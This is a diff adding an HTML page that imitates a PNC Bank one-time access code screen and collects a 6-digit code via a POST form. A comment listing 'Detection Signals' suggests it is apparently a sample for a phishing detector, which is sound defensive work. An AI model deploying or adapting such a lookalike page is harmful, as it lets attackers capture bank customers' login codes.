@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PNC - Secure Access Code</title>
+    <style>
+        body { font-family: Arial, Helvetica, sans-serif; background: #e5e5e5; margin: 0; padding: 0; }
+        .pnc-container { max-width: 500px; margin: 50px auto; background: white; border-radius: 4px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .pnc-header { background: #f47920; padding: 25px; color: white; }
+        .pnc-logo { font-size: 30px; font-weight: bold; }
+        .pnc-tagline { font-size: 12px; margin-top: 5px; }
+        .pnc-body { padding: 35px; }
+        .pnc-heading { color: #f47920; margin-bottom: 15px; font-size: 22px; }
+        .pnc-description { color: #555; line-height: 1.6; margin-bottom: 25px; }
+        .pnc-input-wrapper { margin-bottom: 20px; }
+        .pnc-input-label { display: block; color: #333; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
+        .pnc-input { width: 100%; padding: 12px; border: 2px solid #ccc; border-radius: 3px; font-size: 16px; box-sizing: border-box; }
+        .pnc-input:focus { border-color: #f47920; outline: none; }
+        .pnc-submit-btn { width: 100%; padding: 14px; background: #f47920; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .pnc-submit-btn:hover { background: #e06810; }
+        .pnc-footer { background: #f5f5f5; padding: 20px; text-align: center; font-size: 13px; color: #666; }
+    </style>
+</head>
+<body>
+    <!-- Detection Signals:
+         - Banking domain: pnc, pnc bank
+         - Security keywords: secure access, verification, authentication
+         - Input patterns: 6-digit code, numeric only
+         - Form structure: header with branding, clear input wrapper
+         - Brand colors: #f47920 (PNC orange)
+         - Common IDs: accessCode, secureCode, verifyCode
+    -->
+    <div class="pnc-container">
+        <div class="pnc-header">
+            <div class="pnc-logo">PNC</div>
+            <div class="pnc-tagline">The PNC Financial Services Group</div>
+        </div>
+
+        <div class="pnc-body">
+            <h2 class="pnc-heading">Secure Access Code Required</h2>
+
+            <p class="pnc-description">
+                To protect your account, we've sent a secure access code to your registered mobile device. Please enter the code below to continue.
+            </p>
+
+            <form id="secureAccessForm" action="/banking/verify-access" method="POST">
+                <div class="pnc-input-wrapper">
+                    <label for="accessCode" class="pnc-input-label">Access Code:</label>
+                    <input
+                        type="text"
+                        id="accessCode"
+                        name="access_code"
+                        class="pnc-input"
+                        placeholder="Enter 6-digit code"
+                        maxlength="6"
+                        pattern="[0-9]{6}"
+                        inputmode="numeric"
+                        autocomplete="one-time-code"
+                        required
+                    />
+                </div>
+
+                <button type="submit" class="pnc-submit-btn">Verify and Continue</button>
+            </form>
+
+            <p style="margin-top: 20px; text-align: center; font-size: 14px;">
+                <a href="#" style="color: #f47920; text-decoration: none;">Didn't receive a code?</a>
+            </p>
+        </div>
+
+        <div class="pnc-footer">
+            Secured with industry-standard encryption
+        </div>
+    </div>
+</body>
+</html>
